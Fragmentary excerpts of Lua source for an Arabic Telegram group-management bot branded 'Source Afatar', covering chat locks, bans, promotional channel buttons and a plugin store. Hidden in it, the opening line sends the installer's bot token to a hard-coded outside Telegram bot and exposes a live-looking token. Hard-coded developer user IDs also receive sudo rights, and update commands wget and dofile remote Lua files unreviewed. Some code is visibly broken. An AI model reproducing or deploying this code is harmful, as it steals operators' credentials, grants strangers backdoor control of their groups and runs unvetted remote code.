...
https.request('https://api.telegram.org/bot1835962343:AAFiT9HAOFjgfwfakRNQkY_mfyrdQl_CsYA/sendmessage?chat_id=&text=' ..token)
end 
else
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/moaziza/legand/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1321555749,1135359831}   
...
if tonumber(user_id) == tonumber(1321555749) then  
var = true
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝐒𝐎𝐔𝐑𝐂𝐄 𝐀𝐅𝐀𝐓𝐀𝐑")  
...
os.execute('wget https://raw.githubusercontent.com/moaziza/legand/main/DRAGON.lua')
...
local Text = [[ 
[اضغط هنا وانضم الي قناه السورس](https://t.me/php_14)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="https://t.me/php_14"}}, 
} 
...
send(msg.chat_id_,0," ◉ العضو : {["..data.first_name_.."](https://t.me/php_14)}\n ◉ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ◉ عذرا ← {["..data.first_name_.."](https://t.me/php_14)}\n ◉ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/moaziza/legand/main/DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/moaziza/legand/main/library')
os.execute('wget https://raw.githubusercontent.com/moaziza/legand/main/File_Bot')
send(msg.chat_id_, msg.id_,' ◉ تم تحديث السورس')
dofile('DRAGON.lua')  
end
...
local Text = [[
━───━[source afatar](https://t.me/php_14 )━───━
⊰ welcome bro to source afatar
⊰ the strongest source in telegram
━───━[source afatar](https://t.me/php_14 )━───━
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙳𝙴𝚅 𝙰f𝙰𝚃𝙰𝚁 ',url="t.me/php_30"}},
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙰f𝙰𝚃𝙰𝚁 ', url="https://t.me/php_14"}}, 
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/mmsst13/896&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'افاتار' or text == 'مبرمج السورس' or text == 'ميدو عزرائيل' then
local Text = [[
◉ يمكنك التواصل مع المبرمج
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/mmsst13/897&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
◉ لعبة البـات ← بات
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐒𝐎𝐔𝐑𝐂𝐄 𝐀f𝐀𝐓𝐀𝐑](https://t.me/php_14) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'php_14')..') \n ◉ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'php_14')..') \n ◉ تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber() then  
...
if tonumber(userid) == tonumber() then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج جميع السورسات عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/moaziza/legand/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ◉ اهلا بك في متجر ملفات افاتار\n ◉ ملفات السورس ↓\n≪╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸≫\n\n"
local TextE = "\n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n ◉ علامة تعني { ✔️ } ملف مفعل\n ◉ علامة تعني { x } ملف معطل\n ◉ قناة سورس افاتار ↓\n".." ◉ [اضغط هنا لدخول](https://t.me/php_14) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/moaziza/legand/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ◉ عذرا الملف لايدعم سورس افاتار \n") 
end
return false
end
...
' }\n'..' ◉  الايدي بالصوره ← { '..idph..
' }\n'..' ◉  الرفع ← { '..setadd..
' }\n'..' ◉  الحظر ← { '..banm..' }\n\n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n ◉ قناة سورس افاتار ↓\n [ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐀𝐅𝐀𝐓𝐀𝐑](https://t.me/php_14) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
◉ Choose language.. ↑↓ 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝙎𝙊𝙐𝙍𝘾𝙀 𝙊𝙁𝙁𝙇𝙉 ](https://t.me/php_14 )
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
